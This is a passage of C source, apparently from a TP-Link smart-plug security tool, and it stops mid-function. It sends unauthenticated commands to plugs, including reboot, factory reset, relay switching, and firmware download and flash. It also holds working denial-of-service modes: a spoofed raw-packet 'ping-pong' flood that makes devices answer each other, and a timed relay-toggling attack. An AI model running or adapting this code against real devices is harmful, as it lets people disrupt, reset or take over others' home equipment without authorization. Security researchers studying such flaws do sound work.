			exit(EXIT_FAILURE);
		}

		readbuff[nreadbuff]= 0x00;

		tp_link_decrypt((unsigned char *)readbuff, nreadbuff);
		exit(EXIT_SUCCESS);
	}
	else if(command_f){
		host_local.nhosts=0;
		host_local.maxhosts= MAX_IPV6_ENTRIES;
		host_local.host= host_locals;

		if(strncmp(command, "get_info", MAX_TP_COMMAND_LENGTH) == 0){
			snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"get_sysinfo\":null},\"emeter\":{\"get_realtime\":null}}");
		}
		else if(strncmp(command, "get_sys_info", MAX_TP_COMMAND_LENGTH) == 0){
			snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"get_sysinfo\":null}}");
		}
		else if(strncmp(command, "get_emeter_info", MAX_TP_COMMAND_LENGTH) == 0){
			snprintf(sendbuff, sizeof(sendbuff), "{\"emeter\":{\"get_realtime\":null}}");
		}
		else if(strncmp(command, "reboot", MAX_TP_COMMAND_LENGTH) == 0){
			snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"reboot\":{\"delay\":%s}}}", arg1?arg1:"1");
		}
		else if(strncmp(command, "reset", MAX_TP_COMMAND_LENGTH) == 0){
			snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"reset\":{\"delay\":%s}}}", arg1?arg1:"1");
		}
		else if(strncmp(command, "set_relay_state", MAX_TP_COMMAND_LENGTH) == 0){
			if(arg1 == NULL || strncmp(arg1, "1", MAX_TP_COMMAND_LENGTH) == 0 || strncmp(arg1, "on", MAX_TP_COMMAND_LENGTH) ==0)
				snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"set_relay_state\":{\"state\":1}}}");
			else if(strncmp(arg1, "0", MAX_TP_COMMAND_LENGTH) == 0 || strncmp(arg1, "off", MAX_TP_COMMAND_LENGTH) == 0)
				snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"set_relay_state\":{\"state\":0}}}");
			else{

				puts("Unknown relay state");
				exit(EXIT_FAILURE);
			}
		}
		else if(strncmp(command, "set_led_off", MAX_TP_COMMAND_LENGTH) == 0){
			if(arg1 == NULL || strncmp(arg1, "1", MAX_TP_COMMAND_LENGTH) ==0)
				snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"set_led_off\":{\"off\":1}}}");
			else if(strncmp(arg1, "0", MAX_TP_COMMAND_LENGTH) == 0 || strncmp(arg1, "off", MAX_TP_COMMAND_LENGTH) == 0)
				snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"set_led_off\":{\"off\":0}}}");
			else{
				puts("Invalid set_led_off parameter");
				exit(EXIT_FAILURE);
			}
		}
		else if(strncmp(command, "set_dev_alias", MAX_TP_COMMAND_LENGTH) == 0){
			snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"set_dev_alias\":{\"alias\":\"%s\"}}}", arg1?arg1:"");
		}
		else if(strncmp(command, "set_mac_addr", MAX_TP_COMMAND_LENGTH) == 0){
			snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"set_mac_addr\":{\"mac\":\"%s\"}}}", arg1?arg1:"");
		}
		else if(strncmp(command, "set_device_id", MAX_TP_COMMAND_LENGTH) == 0){
			snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"set_device_id\":{\"deviceId\":\"%s\"}}}", arg1?arg1:"");
		}
		else if(strncmp(command, "set_hw_id", MAX_TP_COMMAND_LENGTH) == 0){
			snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"set_hw_id\":{\"hwId\":\"%s\"}}}", arg1?arg1:"");
		}
		else if(strncmp(command, "set_dev_location", MAX_TP_COMMAND_LENGTH) == 0){
			snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"set_dev_location\":{\"longitude\":%s,\"latitude\":%s}}}", arg1?arg1:"0",arg2?arg2:"0");
		}
		else if(strncmp(command, "test_check_uboot", MAX_TP_COMMAND_LENGTH) == 0){
			snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"test_check_uboot\":null}}");
		}
		else if(strncmp(command, "get_dev_icon", MAX_TP_COMMAND_LENGTH) == 0){
			snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"get_dev_icon\":null}}");
		}
		else if(strncmp(command, "set_dev_icon", MAX_TP_COMMAND_LENGTH) == 0){
			snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"set_dev_icon\":{\"icon\":\"%s\",\"hash\":\"%s\"}}}", arg1?arg1:"", arg2?arg2:"");
		}
		else if(strncmp(command, "set_test_mode", MAX_TP_COMMAND_LENGTH) == 0){
			if(arg1 == NULL || strncmp(arg1, "1", MAX_TP_COMMAND_LENGTH) == 0 || strncmp(arg1, "on", MAX_TP_COMMAND_LENGTH) == 0)
				snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"set_test_mode\":{\"enable\":1}}}");
			else if(arg1 && (strncmp(arg1, "0", MAX_TP_COMMAND_LENGTH) == 0 || strncmp(arg1, "ff", MAX_TP_COMMAND_LENGTH) == 0))
				snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"set_test_mode\":{\"enable\":0}}}");
			else{
				puts("Invalid option for test mode");
				exit(EXIT_FAILURE);
			}
		}
		else if(strncmp(command, "download_firmware", MAX_TP_COMMAND_LENGTH) == 0){
			snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"download_firmware\":{\"url\":\"%s\"}}}", arg1?arg1:"");
		}
		else if(strncmp(command, "get_download_state", MAX_TP_COMMAND_LENGTH) == 0){
			snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"get_download_state\":{}}}");
		}
		else if(strncmp(command, "flash_firmware", MAX_TP_COMMAND_LENGTH) == 0){
			snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"flash_firmware\":{}}}");
		}
		else if(strncmp(command, "check_new_config", MAX_TP_COMMAND_LENGTH) == 0){
			snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"check_new_config\":{}}}");
		}

		/* XXX: SEND PROBE PACKET */
		nsendbuff= Strnlen(sendbuff, MAX_TP_COMMAND_LENGTH);
/*		printf("Comando sin encriptar: \n#%s#\n\n", sendbuff); */
		tp_link_crypt((unsigned char *)sendbuff, nsendbuff);


		/* If an interface was specified, we select an IPv4 address from such interface */
		if(idata.iface_f){
			if( (voidptr=find_v4addr_for_iface(&(idata.iflist), idata.iface)) == NULL){
				printf("No IPv4 address for interface %s\n", idata.iface);
				exit(EXIT_FAILURE);
			}

			idata.srcaddr= *((struct in_addr *) voidptr);
		}
		else{
			if( (voidptr=find_v4addr(&(idata.iflist))) == NULL){
				puts("No IPv4 address available on local host");
				exit(EXIT_FAILURE);
			}

			idata.srcaddr= *((struct in_addr *)voidptr);
		}

		if( (idata.fd=socket(AF_INET, SOCK_DGRAM, 0)) == -1){
			puts("Could not create socket");
			exit(EXIT_FAILURE);
		}

		if( setsockopt(idata.fd, SOL_SOCKET, SO_BROADCAST, &on, sizeof(on)) == -1){
			puts("Error while setting SO_BROADCAST socket option");
			exit(EXIT_FAILURE);
		}


		memset(&sockaddr_in, 0, sizeof(sockaddr_in));
		sockaddr_in.sin_family= AF_INET;
		sockaddr_in.sin_port= 0;  /* Allow Sockets API to set an ephemeral port */
		sockaddr_in.sin_addr= idata.srcaddr;


		if(bind(idata.fd, (struct sockaddr *) &sockaddr_in, sizeof(sockaddr_in)) == -1){
			puts("Error bind()ing socket to local address");
			exit(EXIT_FAILURE);
		}

		memset(&sockaddr_to, 0, sizeof(sockaddr_to));
		sockaddr_to.sin_family= AF_INET;
		sockaddr_to.sin_port= htons(TP_LINK_SMART_PORT);

		memset(&sockaddr_from, 0, sizeof(sockaddr_from));
		sockaddr_from.sin_family= AF_INET;
		sockaddrfrom_len=sizeof(sockaddr_from);


		if(idata.dstaddr_f){
			sockaddr_to.sin_addr= idata.dstaddr;
		}
		else{
			if ( inet_pton(AF_INET, IP_LIMITED_MULTICAST, &(sockaddr_to.sin_addr)) <= 0){
				puts("inet_pton(): Error setting multicast address");
				exit(EXIT_FAILURE);
			}
		}


		FD_ZERO(&sset);
		FD_SET(idata.fd, &sset);

		lastprobe.tv_sec= 0;	
		lastprobe.tv_usec=0;
		idata.pending_write_f=TRUE;	

		/* The end_f flag is set after the last probe has been sent and a timeout period has elapsed.
		   That is, we give responses enough time to come back
		 */
		while(!end_f){
			rset= sset;
			wset= sset;
			eset= sset;

			if(!donesending_f){
				/* This is the retransmission timer */
				timeout.tv_sec= 1;
				timeout.tv_usec= 0;
			}
			else{
				/* XXX: This should use the parameter from command line */
				timeout.tv_sec= idata.local_timeout;
				timeout.tv_usec=0;
			}

			/*
				Check for readability and exceptions. We only check for writeability if there is pending data
				to send.
			 */
			if((sel=select(idata.fd+1, &rset, (idata.pending_write_f?&wset:NULL), &eset, &timeout)) == -1){
				if(errno == EINTR){
					continue;
				}
				else{
					perror("iot-tl-plug:");
					exit(EXIT_FAILURE);
				}
			}

			if(gettimeofday(&curtime, NULL) == -1){
				if(idata.verbose_f)
					perror("iot-tl-plug");

				exit(EXIT_FAILURE);
			}

			/* Check whether we have finished probing all targets */
			if(donesending_f){
				/*
				   Just wait for SELECT_TIMEOUT seconds for any incoming responses.
				*/

				if(is_time_elapsed(&curtime, &lastprobe, idata.local_timeout * 1000000)){
					end_f=TRUE;
				}
			}


			if(sel && FD_ISSET(idata.fd, &rset)){
				/* XXX: Process response packet */

				if( (nreadbuff = recvfrom(idata.fd, readbuff, sizeof(readbuff), 0, (struct sockaddr *)&sockaddr_from, &sockaddrfrom_len)) == -1){
					perror("iot-tl-plug: ");
					exit(EXIT_FAILURE);
				}

				if(nreadbuff>= (sizeof(readbuff)-1)){
					/* XXX: SHould never happen, but let's play safe */
					puts("Response is too large");
					continue;
				}

				readbuff[nreadbuff]= 0x00; /* Null-terminate what we read, so that we can printf() it */

				if(inet_ntop(AF_INET, &(sockaddr_from.sin_addr), pv4addr, sizeof(pv4addr)) == NULL){
					perror("iot-tl-plug: ");
					exit(EXIT_FAILURE);
				}

				tp_link_decrypt((unsigned char *)readbuff, nreadbuff);
				printf("Got response from: %s, port %u\n%s\n\n", pv4addr, ntohs(sockaddr_from.sin_port), readbuff);
			}

			if(!donesending_f && !idata.pending_write_f && is_time_elapsed(&curtime, &lastprobe, 1 * 1000000)){
				idata.pending_write_f=TRUE;
				continue;
			}

			if(!donesending_f && idata.pending_write_f && FD_ISSET(idata.fd, &wset)){
				idata.pending_write_f=FALSE;

				if( sendto(idata.fd, sendbuff, nsendbuff, 0, (struct sockaddr *) &sockaddr_to, sizeof(sockaddr_to)) == -1){
					perror("iot-tl-plug: ");
					exit(EXIT_FAILURE);
				}

				if(gettimeofday(&lastprobe, NULL) == -1){
					if(idata.verbose_f)
						perror("iot-tl-plug");

					exit(EXIT_FAILURE);
				}

				retrans++;

				if(retrans >= idata.local_retrans)
					donesending_f= 1;

			}


			if(FD_ISSET(idata.fd, &eset)){
				if(idata.verbose_f)
					puts("iot-tl-plug: Found exception on libpcap descriptor");

				exit(EXIT_FAILURE);
			}
		}

		exit(EXIT_SUCCESS);
	}

	else if(json_f && proto_f && proto == IPPROTO_TCP){

		/* XXX: SEND PROBE PACKET */
		nsendbuff= Strnlen(json, MAX_TP_COMMAND_LENGTH);
		if(nsendbuff > sizeof(sendbuff)){
			puts("Command is too large");
			exit(EXIT_FAILURE);
		}

		memcpy(sendbuff, json, nsendbuff);
		printf("Comando sin encriptar: \n#%s#\n\n", sendbuff);
		tp_link_crypt((unsigned char *)sendbuff, nsendbuff);


		/* If an interface was specified, we select an IPv4 address from such interface */
		if(idata.iface_f){
			if( (voidptr=find_v4addr_for_iface(&(idata.iflist), idata.iface)) == NULL){
				printf("No IPv4 address for interface %s\n", idata.iface);
				exit(EXIT_FAILURE);
			}

			idata.srcaddr= *((struct in_addr *) voidptr);
		}
		else{
			if( (voidptr=find_v4addr(&(idata.iflist))) == NULL){
				puts("No IPv4 address available on local host");
				exit(EXIT_FAILURE);
			}

			idata.srcaddr= *((struct in_addr *)voidptr);
		}

		if( (idata.fd=socket(AF_INET, SOCK_STREAM, 0)) == -1){
			puts("Could not create socket");
			exit(EXIT_FAILURE);
		}

		memset(&sockaddr_in, 0, sizeof(sockaddr_in));
		sockaddr_in.sin_family= AF_INET;
		sockaddr_in.sin_port= 0;  /* Allow Sockets API to set an ephemeral port */
		sockaddr_in.sin_addr= idata.srcaddr;


		if(bind(idata.fd, (struct sockaddr *) &sockaddr_in, sizeof(sockaddr_in)) == -1){
			puts("Error bind()ing socket to local address");
			exit(EXIT_FAILURE);
		}

		memset(&sockaddr_to, 0, sizeof(sockaddr_to));
		sockaddr_to.sin_family= AF_INET;
		sockaddr_to.sin_port= htons(TP_LINK_SMART_PORT);

		if(idata.dstaddr_f){
			sockaddr_to.sin_addr= idata.dstaddr;
		}
		else{
			puts("Must specify destination address");
			exit(EXIT_FAILURE);
		}

		if( connect( idata.fd, (struct sockaddr *) &sockaddr_to, sizeof( sockaddr_to)) < 0) {
			perror( "connect error");
			exit(EXIT_FAILURE);
		}	

		datalen= htonl(nsendbuff);
		if(write(idata.fd, &datalen, sizeof(datalen)) <0){
			perror("iot-tl-plug:");
			exit(EXIT_FAILURE);
		}

		i=0;
		{
			if( (nbytes=write(idata.fd, sendbuff+i, nsendbuff-i)) < 0){
				perror("iot-tl-plug:");
				exit(EXIT_FAILURE);
			}

			i=i+nbytes;
		}while(i<nsendbuff);
		

		nreadbuff=0;
		while( nreadbuff < 4 && (nbytes=read(idata.fd, (readbuff+nreadbuff), 4-nreadbuff) ) > 0){
			nreadbuff= nreadbuff+nbytes;
		}

		datalen= ntohl(*((uint32_t *)readbuff));
		if(datalen >= sizeof(readbuff)){
			puts("Response is too large");
			exit(EXIT_FAILURE);
		}	

		nreadbuff=0;
		while( (nreadbuff< datalen) && (nbytes=read(idata.fd, (readbuff+nreadbuff), datalen-nreadbuff) ) > 0){
			nreadbuff= nreadbuff+nbytes;
		}

		if(nbytes < 0){
			perror("iot-tl-plug:");
			exit(EXIT_FAILURE);
		}

		readbuff[nreadbuff]= 0x00;

		tp_link_decrypt((unsigned char *)readbuff, nreadbuff);
		exit(EXIT_SUCCESS);
	}
	else if(json_f){
		host_local.nhosts=0;
		host_local.maxhosts= MAX_IPV6_ENTRIES;
		host_local.host= host_locals;


		if(! idata.srcaddr_f){
		/* If an interface was specified, we select an IPv4 address from such interface */
			if(idata.iface_f){
				if( (voidptr=find_v4addr_for_iface(&(idata.iflist), idata.iface)) == NULL){
					printf("No IPv4 address for interface %s\n", idata.iface);
					exit(EXIT_FAILURE);
				}

				idata.srcaddr= *((struct in_addr *) voidptr);
			}
			else{
				if( (voidptr=find_v4addr(&(idata.iflist))) == NULL){
					puts("No IPv4 address available on local host");
					exit(EXIT_FAILURE);
				}

				idata.srcaddr= *((struct in_addr *)voidptr);
			}
		}

		if( (idata.fd=socket(AF_INET, SOCK_DGRAM, 0)) == -1){
			puts("Could not create socket");
			exit(EXIT_FAILURE);
		}

		if( setsockopt(idata.fd, SOL_SOCKET, SO_BROADCAST, &on, sizeof(on)) == -1){
			puts("Error while setting SO_BROADCAST socket option");
			exit(EXIT_FAILURE);
		}

		memset(&sockaddr_in, 0, sizeof(sockaddr_in));
		sockaddr_in.sin_family= AF_INET;
		sockaddr_in.sin_addr= idata.srcaddr;

		if(idata.srcport_f){
			sockaddr_in.sin_port= htons(idata.srcport);
		}
		else{
			sockaddr_in.sin_port= 0;  /* Allow Sockets API to set an ephemeral port */
		}

		if(bind(idata.fd, (struct sockaddr *) &sockaddr_in, sizeof(sockaddr_in)) == -1){
			puts("Error bind()ing socket to local address");
			exit(EXIT_FAILURE);
		}

		memset(&sockaddr_to, 0, sizeof(sockaddr_to));
		sockaddr_to.sin_family= AF_INET;

		if(idata.dstport_f){
			sockaddr_to.sin_port= htons(idata.dstport);
		}
		else{
			sockaddr_to.sin_port= htons(TP_LINK_SMART_PORT);
			idata.dstport= TP_LINK_SMART_PORT;
		}

		memset(&sockaddr_from, 0, sizeof(sockaddr_from));
		sockaddr_from.sin_family= AF_INET;
		sockaddrfrom_len=sizeof(sockaddr_from);

		if(idata.dstaddr_f){
			sockaddr_to.sin_addr= idata.dstaddr;
		}
		else{
			if ( inet_pton(AF_INET, IP_LIMITED_MULTICAST, &(sockaddr_to.sin_addr)) <= 0){
				puts("inet_pton(): Error setting multicast address");
				exit(EXIT_FAILURE);
			}
		}


		FD_ZERO(&sset);
		FD_SET(idata.fd, &sset);

		lastprobe.tv_sec= 0;	
		lastprobe.tv_usec=0;
		idata.pending_write_f=TRUE;	

		/* The end_f flag is set after the last probe has been sent and a timeout period has elapsed.
		   That is, we give responses enough time to come back
		 */
		while(!end_f){
			rset= sset;
			wset= sset;
			eset= sset;

			if(!donesending_f){
				/* This is the retransmission timer */
				timeout.tv_sec= 1;
				timeout.tv_usec= 0;
			}
			else{
				/* XXX: This should use the parameter from command line */
				timeout.tv_sec= idata.local_timeout;
				timeout.tv_usec=0;
			}

			/*
				Check for readability and exceptions. We only check for writeability if there is pending data
				to send.
			 */
			if((sel=select(idata.fd+1, &rset, (idata.pending_write_f?&wset:NULL), &eset, &timeout)) == -1){
				if(errno == EINTR){
					continue;
				}
				else{
					perror("iot-tl-plug:");
					exit(EXIT_FAILURE);
				}
			}

			if(gettimeofday(&curtime, NULL) == -1){
				if(idata.verbose_f)
					perror("iot-tl-plug");

				exit(EXIT_FAILURE);
			}

			/* Check whether we have finished probing all targets */
			if(donesending_f){
				/*
				   Just wait for SELECT_TIMEOUT seconds for any incoming responses.
				*/

				if(is_time_elapsed(&curtime, &lastprobe, idata.local_timeout * 1000000)){
					end_f=TRUE;
				}
			}


			if(sel && FD_ISSET(idata.fd, &rset)){
				/* XXX: Process response packet */

				if( (nreadbuff = recvfrom(idata.fd, readbuff, sizeof(readbuff), 0, (struct sockaddr *)&sockaddr_from, &sockaddrfrom_len)) == -1){
					perror("iot-tl-plug: ");
					exit(EXIT_FAILURE);
				}

				if(nreadbuff>= (sizeof(readbuff)-1)){
					/* XXX: SHould never happen, but let's play safe */
					puts("Response is too large");
					continue;
				}

				readbuff[nreadbuff]= 0x00; /* Null-terminate what we read, so that we can printf() it */

				if(inet_ntop(AF_INET, &(sockaddr_from.sin_addr), pv4addr, sizeof(pv4addr)) == NULL){
					perror("iot-tl-plug: ");
					exit(EXIT_FAILURE);
				}

				tp_link_decrypt((unsigned char *)readbuff, nreadbuff);
				printf("Got response from: %s\n%s\n\n", pv4addr, readbuff);
			}

			if(!donesending_f && !idata.pending_write_f && is_time_elapsed(&curtime, &lastprobe, 1 * 1000000)){
				idata.pending_write_f=TRUE;
				continue;
			}

			if(!donesending_f && idata.pending_write_f && FD_ISSET(idata.fd, &wset)){
				idata.pending_write_f=FALSE;

				/* XXX: SEND PROBE PACKET */
				nsendbuff= Strnlen(json, MAX_TP_COMMAND_LENGTH);
				memcpy(sendbuff, json, nsendbuff);
				tp_link_crypt((unsigned char *)sendbuff, nsendbuff);

				if( sendto(idata.fd, sendbuff, nsendbuff, 0, (struct sockaddr *) &sockaddr_to, sizeof(sockaddr_to)) == -1){
					perror("iot-tl-plug: ");
					exit(EXIT_FAILURE);
				}

				if(gettimeofday(&lastprobe, NULL) == -1){
					if(idata.verbose_f)
						perror("iot-tl-plug");

					exit(EXIT_FAILURE);
				}

				retrans++;

				if(retrans >= idata.local_retrans)
					donesending_f= 1;

			}


			if(FD_ISSET(idata.fd, &eset)){
				if(idata.verbose_f)
					puts("iot-tl-plug: Found exception on libpcap descriptor");

				exit(EXIT_FAILURE);
			}
		}

		exit(EXIT_SUCCESS);
	}

	else if(dos_pingpong_f){
		host_local.nhosts=0;
		host_local.maxhosts= MAX_IPV6_ENTRIES;
		host_local.host= host_locals;

		if((idata.fd= socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
			perror("socket");
			exit(EXIT_FAILURE);
		}

		release_privileges();

		if(setsockopt(idata.fd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on))<0){
			perror("setsockopt");
			exit(EXIT_FAILURE);
		}

		if( setsockopt(idata.fd, SOL_SOCKET, SO_BROADCAST, &on, sizeof(on)) == -1){
			puts("Error while setting SO_BROADCAST socket option");
			exit(EXIT_FAILURE);
		}

		if(!idata.srcport_f){
			idata.srcport= TP_LINK_SMART_PORT;
		}

		if(!idata.dstport_f){
			idata.dstport=TP_LINK_SMART_PORT;
		}

		if(!idata.dstaddr_f){
			if ( inet_pton(AF_INET, IP_LIMITED_MULTICAST, &(idata.dstaddr)) <= 0){
				puts("inet_pton(): Error setting multicast address");
				exit(EXIT_FAILURE);
			}
		}

		FD_ZERO(&sset);
		FD_SET(idata.fd, &sset);

		lastprobe.tv_sec= 0;	
		lastprobe.tv_usec=0;

		if(attack_length_f){
			if(gettimeofday(&starttime, NULL) == -1){
				if(idata.verbose_f)
					perror("iot-tl-plug");

				exit(EXIT_FAILURE);
			}
		}

		idata.pending_write_f=TRUE;	

		/* The end_f flag is set after the last probe has been sent and a timeout period has elapsed.
		   That is, we give responses enough time to come back
		 */
		while(!end_f){
			rset= sset;
			wset= sset;
			eset= sset;

			timeout.tv_sec= delay/1000;
			timeout.tv_usec= (delay%1000) * 1000;

			/*
				Check for readability and exceptions. We only check for writeability if there is pending data
				to send.
			 */
			if((sel=select(idata.fd+1, NULL, (idata.pending_write_f?&wset:NULL), &eset, &timeout)) == -1){
				if(errno == EINTR){
					continue;
				}
				else{
					perror("iot-tl-plug:");
					exit(EXIT_FAILURE);
				}
			}

			if(gettimeofday(&curtime, NULL) == -1){
				if(idata.verbose_f)
					perror("iot-tl-plug");

				exit(EXIT_FAILURE);
			}


			if(attack_length_f && is_time_elapsed(&curtime, &starttime, attack_length * 1000000)){
				end_f=TRUE;
			}


			if(!idata.pending_write_f && is_time_elapsed(&curtime, &lastprobe, delay * 1000)){
				idata.pending_write_f=TRUE;
				continue;
			}

			if(idata.pending_write_f && FD_ISSET(idata.fd, &wset)){
					idata.pending_write_f=FALSE;

				/* XXX: SEND PROBE PACKET */
					nsendbuff= Strnlen(TP_LINK_PING_PONG, MAX_TP_COMMAND_LENGTH);
					memcpy(sendbuff + sizeof(struct ip_hdr) + sizeof(struct udp_hdr), TP_LINK_PING_PONG, nsendbuff);
					tp_link_crypt((unsigned char *) sendbuff + sizeof(struct ip_hdr) + sizeof(struct udp_hdr), nsendbuff);

					/* Fill the UDP pseudo-header */			
					pseudohdr = (struct pseudohdr *) ((char *)sendbuff+ sizeof(struct ip_hdr) - sizeof(struct pseudohdr));
					memset(pseudohdr, 0, sizeof(struct pseudohdr));
					pseudohdr->saddr= idata.srcaddr;
					pseudohdr->daddr= idata.dstaddr;
					pseudohdr->mbz= 0;
					pseudohdr->protocol= IPPROTO_UDP;
					pseudohdr->length= htons(sizeof(struct udp_hdr)+ nsendbuff);


					/* Fill the UDP header  */

					udp_hdr = (struct udp_hdr *) ((char *) sendbuff + sizeof(struct ip_hdr));
					memset(udp_hdr, 0, sizeof(struct udp_hdr));
					udp_hdr->uh_sport = htons(idata.srcport); 
					udp_hdr->uh_dport = htons(idata.dstport); 
					udp_hdr->uh_ulen= htons(sizeof(struct udp_hdr)+nsendbuff);
					udp_hdr->uh_sum=0;
					udp_hdr->uh_sum= in_chksum((u_int16_t *) pseudohdr, sizeof(struct udp_hdr)+sizeof(struct pseudohdr)+nsendbuff);

					ip_hdr=(struct ip_hdr *) (sendbuff);
					memset(ip_hdr, 0, sizeof(struct ip_hdr));
			
					ip_hdr->ip_v = 4;			 /* IPv4 */
					ip_hdr->ip_hl= 20 >> 2;
					ip_hdr->ip_tos= 0;
					ip_hdr->ip_len= htons(sizeof(struct ip_hdr) + sizeof(udp_hdr) + nsendbuff);
					ip_hdr->ip_src= idata.srcaddr;
					ip_hdr->ip_dst= idata.dstaddr;
					ip_hdr->ip_id= rand();
					ip_hdr->ip_off= htons(IP_DF); /* XXX */
					ip_hdr->ip_ttl= 255;
					ip_hdr->ip_p= IPPROTO_UDP;
					ip_hdr->ip_sum = 0;
					ip_hdr->ip_sum = in_chksum((u_int16_t *) ip_hdr, sizeof(struct ip_hdr));

					nsendbuff= nsendbuff+ sizeof(struct ip_hdr) + sizeof(struct udp_hdr);

					if( sendto(idata.fd, sendbuff, nsendbuff, 0, (struct sockaddr *) &sockaddr_to, sizeof(sockaddr_to)) == -1){
						perror("iot-tl-plug: ");
						exit(EXIT_FAILURE);
					}

					if(gettimeofday(&lastprobe, NULL) == -1){
						if(idata.verbose_f)
							perror("iot-tl-plug");

						exit(EXIT_FAILURE);
					}
			}


			if(FD_ISSET(idata.fd, &eset)){
				if(idata.verbose_f)
					puts("iot-tl-plug: Found exception on libpcap descriptor");

				exit(EXIT_FAILURE);
			}
		}

		exit(EXIT_SUCCESS);
	}

	else if(dos_toggle_f){
		host_local.nhosts=0;
		host_local.maxhosts= MAX_IPV6_ENTRIES;
		host_local.host= host_locals;


		if(! idata.srcaddr_f){
		/* If an interface was specified, we select an IPv4 address from such interface */
			if(idata.iface_f){
				if( (voidptr=find_v4addr_for_iface(&(idata.iflist), idata.iface)) == NULL){
					printf("No IPv4 address for interface %s\n", idata.iface);
					exit(EXIT_FAILURE);
				}

				idata.srcaddr= *((struct in_addr *) voidptr);
			}
			else{
				if( (voidptr=find_v4addr(&(idata.iflist))) == NULL){
					puts("No IPv4 address available on local host");
					exit(EXIT_FAILURE);
				}

				idata.srcaddr= *((struct in_addr *)voidptr);
			}
		}

		if( (idata.fd=socket(AF_INET, SOCK_DGRAM, 0)) == -1){
			puts("Could not create socket");
			exit(EXIT_FAILURE);
		}

		if( setsockopt(idata.fd, SOL_SOCKET, SO_BROADCAST, &on, sizeof(on)) == -1){
			puts("Error while setting SO_BROADCAST socket option");
			exit(EXIT_FAILURE);
		}

		memset(&sockaddr_in, 0, sizeof(sockaddr_in));
		sockaddr_in.sin_family= AF_INET;
		sockaddr_in.sin_addr= idata.srcaddr;

		if(idata.srcport_f){
			sockaddr_in.sin_port= htons(idata.srcport);
		}
		else{
			sockaddr_in.sin_port= 0;  /* Allow Sockets API to set an ephemeral port */
		}

		if(bind(idata.fd, (struct sockaddr *) &sockaddr_in, sizeof(sockaddr_in)) == -1){
			puts("Error bind()ing socket to local address");
			exit(EXIT_FAILURE);
		}

		memset(&sockaddr_to, 0, sizeof(sockaddr_to));
		sockaddr_to.sin_family= AF_INET;

		if(idata.dstport_f){
			sockaddr_to.sin_port= htons(idata.dstport);
		}
		else{
			sockaddr_to.sin_port= htons(TP_LINK_SMART_PORT);
			idata.dstport= TP_LINK_SMART_PORT;
		}

		memset(&sockaddr_from, 0, sizeof(sockaddr_from));
		sockaddr_from.sin_family= AF_INET;
		sockaddrfrom_len=sizeof(sockaddr_from);


		if(idata.dstaddr_f){
			sockaddr_to.sin_addr= idata.dstaddr;
		}
		else{
			if ( inet_pton(AF_INET, IP_LIMITED_MULTICAST, &(sockaddr_to.sin_addr)) <= 0){
				puts("inet_pton(): Error setting multicast address");
				exit(EXIT_FAILURE);
			}
		}


		FD_ZERO(&sset);
		FD_SET(idata.fd, &sset);

		if(attack_length_f){
			if(gettimeofday(&starttime, NULL) == -1){
				if(idata.verbose_f)
					perror("iot-tl-plug");

				exit(EXIT_FAILURE);
			}
		}

		lastprobe.tv_sec= 0;	
		lastprobe.tv_usec=0;
		idata.pending_write_f=TRUE;	

		/* The end_f flag is set after the last probe has been sent and a timeout period has elapsed.
		   That is, we give responses enough time to come back
		 */
		while(!end_f){
			rset= sset;
			wset= sset;
			eset= sset;

			if(!donesending_f){
				/* This is the retransmission timer */
				timeout.tv_sec= delay/1000;
				timeout.tv_usec= (delay%1000) * 1000;
			}
			else{
				/* XXX: This should use the parameter from command line */
				timeout.tv_sec= 1;
				timeout.tv_usec= 0;
			}

			/*
				Check for readability and exceptions. We only check for writeability if there is pending data
				to send. If the verbose option is not set, we don't listen to responses.
			 */
			if((sel=select(idata.fd+1, (idata.verbose_f?&rset:NULL), (idata.pending_write_f?&wset:NULL), &eset, &timeout)) == -1){
				if(errno == EINTR){
					continue;
				}
				else{
					perror("iot-tl-plug:");
					exit(EXIT_FAILURE);
				}
			}

			if(gettimeofday(&curtime, NULL) == -1){
				if(idata.verbose_f)
					perror("iot-tl-plug");

				exit(EXIT_FAILURE);
			}

			/* Check whether we have finished probing all targets */
			if(donesending_f){
				/*
				   Just wait for SELECT_TIMEOUT seconds for any incoming responses.
				*/

				if(is_time_elapsed(&curtime, &lastprobe, idata.local_timeout * 1000000)){
					end_f=TRUE;
				}
			}


			if(idata.verbose_f && sel && FD_ISSET(idata.fd, &rset)){
				/* XXX: Process response packet */

				if( (nreadbuff = recvfrom(idata.fd, readbuff, sizeof(readbuff), 0, (struct sockaddr *)&sockaddr_from, &sockaddrfrom_len)) == -1){
					perror("iot-tl-plug: ");
					exit(EXIT_FAILURE);
				}

				if(nreadbuff>= (sizeof(readbuff)-1)){
					/* XXX: SHould never happen, but let's play safe */
					puts("Response is too large");
					continue;
				}

				readbuff[nreadbuff]= 0x00; /* Null-terminate what we read, so that we can printf() it */

				if(inet_ntop(AF_INET, &(sockaddr_from.sin_addr), pv4addr, sizeof(pv4addr)) == NULL){
					perror("iot-tl-plug: ");
					exit(EXIT_FAILURE);
				}

				tp_link_decrypt((unsigned char *)readbuff, nreadbuff);
				printf("%s:%s\n", pv4addr, readbuff);
			}

			if(!donesending_f && !idata.pending_write_f && is_time_elapsed(&curtime, &lastprobe, delay * 1000)){
				idata.pending_write_f=TRUE;
				continue;
			}

			if(!donesending_f && idata.pending_write_f && FD_ISSET(idata.fd, &wset)){
				idata.pending_write_f=FALSE;

				if(set == SET_RELAY_ON){
					setptr= TP_LINK_SET_RELAY_ON;
